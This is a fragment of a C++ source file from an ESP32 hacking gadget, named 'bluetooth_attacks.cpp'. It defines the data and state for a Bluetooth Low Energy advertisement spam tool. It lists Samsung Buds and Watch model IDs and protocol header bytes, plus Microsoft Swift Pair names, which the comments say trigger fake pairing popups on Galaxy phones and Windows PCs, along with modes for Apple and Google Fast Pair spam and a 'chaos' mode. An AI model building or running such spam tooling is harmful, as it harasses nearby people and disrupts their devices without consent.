rgomez31UAQ/ESP32-DIV_CYD-Gadget/bluetooth_attacks.cpp
#define SAMSUNG_BUDS_COUNT 20

static const uint8_t SAMSUNG_BUDS_IDS[SAMSUNG_BUDS_COUNT][3] = {
    {0xEE, 0x7A, 0x01},  // Galaxy Buds (2019)
    {0x9B, 0x7A, 0x01},  // Galaxy Buds+
    {0x9B, 0x7A, 0x02},  // Galaxy Buds+ Black
    {0x4E, 0x85, 0x01},  // Galaxy Buds Live
    {0x4E, 0x85, 0x02},  // Galaxy Buds Live Black
    {0x4E, 0x85, 0x03},  // Galaxy Buds Live White
    {0xA7, 0x2F, 0x01},  // Galaxy Buds Pro
    {0xA7, 0x2F, 0x02},  // Galaxy Buds Pro Silver
    {0xA7, 0x2F, 0x03},  // Galaxy Buds Pro Violet
    {0x74, 0x87, 0x01},  // Galaxy Buds2
    {0x74, 0x87, 0x02},  // Galaxy Buds2 White
    {0x74, 0x87, 0x03},  // Galaxy Buds2 Purple
    {0xAE, 0x59, 0x01},  // Galaxy Buds2 Pro
    {0xAE, 0x59, 0x02},  // Galaxy Buds2 Pro White
    {0xAE, 0x59, 0x03},  // Galaxy Buds2 Pro Gray
    {0x53, 0xD4, 0x01},  // Galaxy Buds FE
    {0x53, 0xD4, 0x02},  // Galaxy Buds FE White
    {0xB6, 0xC4, 0x01},  // Galaxy Buds3
    {0xB6, 0xC4, 0x02},  // Galaxy Buds3 Pro
    {0x11, 0xA0, 0x01}   // Galaxy Buds+ Rose
};

static const char* SAMSUNG_BUDS_NAMES[SAMSUNG_BUDS_COUNT] = {
    "Galaxy Buds",
    "Galaxy Buds+",
    "Buds+ Black",
    "Buds Live",
    "Buds Live B",
    "Buds Live W",
    "Buds Pro",
    "Buds Pro S",
    "Buds Pro V",
    "Buds2",
    "Buds2 White",
    "Buds2 Purple",
    "Buds2 Pro",
    "Buds2 Pro W",
    "Buds2 Pro G",
    "Buds FE",
    "Buds FE W",
    "Buds3",
    "Buds3 Pro",
    "Buds+ Rose"
};

// Samsung Buds fixed header and tail bytes for EasySetup protocol
static const uint8_t SAMSUNG_BUDS_HDR[] = {0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09};
static const uint8_t SAMSUNG_BUDS_TAIL[] = {0x06, 0x3C, 0x94, 0x8E, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x00};

// ═══════════════════════════════════════════════════════════════════════════
// SAMSUNG WATCH (Company ID 0x0075)
// Triggers Samsung Watch pairing popup on Galaxy phones
// 1-byte Watch Model ID
// ═══════════════════════════════════════════════════════════════════════════

#define SAMSUNG_WATCH_COUNT 25

static const uint8_t SAMSUNG_WATCH_IDS[SAMSUNG_WATCH_COUNT] = {
    0x01,  // Galaxy Watch4 40mm
    0x02,  // Galaxy Watch4 44mm
    0x03,  // Galaxy Watch4 Classic 42mm
    0x04,  // Galaxy Watch4 Classic 46mm
    0x05,  // Galaxy Watch5 40mm
    0x06,  // Galaxy Watch5 44mm
    0x07,  // Galaxy Watch5 Pro 45mm
    0x08,  // Galaxy Watch6 40mm
    0x09,  // Galaxy Watch6 44mm
    0x0A,  // Galaxy Watch6 Classic 43mm
    0x0B,  // Galaxy Watch6 Classic 47mm
    0x0C,  // Galaxy Watch FE
    0x0D,  // Galaxy Watch Ultra
    0x0E,  // Galaxy Watch4 LTE
    0x0F,  // Galaxy Watch5 LTE
    0x10,  // Galaxy Watch6 LTE
    0x11,  // Galaxy Watch Active2 40mm
    0x12,  // Galaxy Watch Active2 44mm
    0x13,  // Galaxy Watch3 41mm
    0x14,  // Galaxy Watch3 45mm
    0x15,  // Galaxy Watch3 Active 41mm
    0x16,  // Galaxy Fit2
    0x17,  // Galaxy Fit3
    0x18,  // Galaxy Watch7 40mm
    0x19   // Galaxy Watch7 44mm
};

static const char* SAMSUNG_WATCH_NAMES[SAMSUNG_WATCH_COUNT] = {
    "Watch4 40",
    "Watch4 44",
    "Watch4C 42",
    "Watch4C 46",
    "Watch5 40",
    "Watch5 44",
    "Watch5 Pro",
    "Watch6 40",
    "Watch6 44",
    "Watch6C 43",
    "Watch6C 47",
    "Watch FE",
    "Watch Ultra",
    "Watch4 LTE",
    "Watch5 LTE",
    "Watch6 LTE",
    "Active2 40",
    "Active2 44",
    "Watch3 41",
    "Watch3 45",
    "Watch3A 41",
    "Fit2",
    "Fit3",
    "Watch7 40",
    "Watch7 44"
};

// Samsung Watch fixed header for pairing protocol
static const uint8_t SAMSUNG_WATCH_HDR[] = {0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43};

// ═══════════════════════════════════════════════════════════════════════════
// MICROSOFT SWIFT PAIR (Company ID 0x0006)
// Triggers "New Bluetooth device found" on Windows 10/11
// Device name as ASCII string in advertisement
// ═══════════════════════════════════════════════════════════════════════════

#define SWIFT_PAIR_COUNT 10

static const char* SWIFT_PAIR_NAMES[SWIFT_PAIR_COUNT] = {
    "HH Speaker",
    "BT Mouse",
    "BT Keyboard",
    "Headphones",
    "Controller",
    "Earbuds",
    "Smart Watch",
    "Fitness",
    "BT Adapter",
    "Soundbar"
};

// ═══════════════════════════════════════════════════════════════════════════
// DEVICE COUNTS PER MODE
// ═══════════════════════════════════════════════════════════════════════════

static const int MODE_DEVICE_COUNTS[] = {
    APPLE_COUNT,          // 20
    SOUR_APPLE_COUNT,     // 14
    FAST_PAIR_COUNT,      // 15
    SAMSUNG_BUDS_COUNT,   // 20
    SAMSUNG_WATCH_COUNT,  // 25
    SWIFT_PAIR_COUNT,     // 10
    0                     // CHAOS uses all
};

// ═══════════════════════════════════════════════════════════════════════════
// STATE VARIABLES
// ═══════════════════════════════════════════════════════════════════════════

static bool initialized = false;
static volatile bool spamming = false;
static bool exitRequested = false;
static volatile int currentMode = MODE_APPLE_POPUP;
static int initialMode = -1;

static volatile uint32_t packetCount = 0;
static volatile uint32_t rateWindowCount = 0;
static volatile uint16_t currentRate = 0;

// Per-mode device index (persists when switching modes)
static volatile int deviceIndex[MODE_COUNT] = {0};
static int chaosStep = 0;

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE TASK MANAGEMENT
// Core 0: BLE broadcast engine (doBroadcast loop)
// Core 1: Display + touch (Arduino main loop)
// ═══════════════════════════════════════════════════════════════════════════

static TaskHandle_t spamTaskHandle = NULL;
static volatile bool spamTaskRunning = false;

// ═══════════════════════════════════════════════════════════════════════════
// SCROLLING BROADCAST LOG
// ═══════════════════════════════════════════════════════════════════════════

#define SP_LOG_MAX_LINES 12
#define SP_LOG_LINE_HEIGHT 12
#define SP_LOG_START_Y 95
#define SP_LOG_END_Y (tft.height() - 80)

static char logLines[SP_LOG_MAX_LINES][42];  // Fixed char buffers (no heap alloc)
static uint16_t logColors[SP_LOG_MAX_LINES];
static volatile int logCount = 0;
static volatile bool logDirty = false;  // Core 0 sets via addLogEntry, Core 1 reads in drawLog

// ═══════════════════════════════════════════════════════════════════════════
// SKULL ANIMATION - 2 rows of 8 (matches BLE Jammer pattern)
// ═══════════════════════════════════════════════════════════════════════════

#define SP_SKULL_Y (SCREEN_HEIGHT - 48)
#define SP_SKULL_ROWS 1
#define SP_SKULL_ROW_SPACING 15
#define SP_SKULL_NUM 8

static int skullFrame = 0;
static const unsigned char* spSkulls[SP_SKULL_NUM] = {
    bitmap_icon_skull_wifi,
    bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir,
    bitmap_icon_skull_tools,
    bitmap_icon_skull_setting,
    bitmap_icon_skull_about
};

// ═══════════════════════════════════════════════════════════════════════════
// ICON BAR - 6 icons
// Back(10) | Toggle(60) | PrevMode(105) | NextMode(140) | PrevDev(180) | NextDev(215)
// ═══════════════════════════════════════════════════════════════════════════

#define SP_ICON_SIZE 16
#define SP_ICON_NUM 6

static const int spIconX[SP_ICON_NUM] = {10, 60, 105, 140, 180, 215};
static const unsigned char* spIcons[SP_ICON_NUM] = {
    bitmap_icon_go_back,           // 0: Back/Exit
    bitmap_icon_start,             // 1: Toggle spam ON/OFF
    bitmap_icon_sort_down_minus,   // 2: Previous mode
    bitmap_icon_sort_up_plus,      // 3: Next mode
    bitmap_icon_LEFT,              // 4: Previous device
    bitmap_icon_RIGHT              // 5: Next device
};

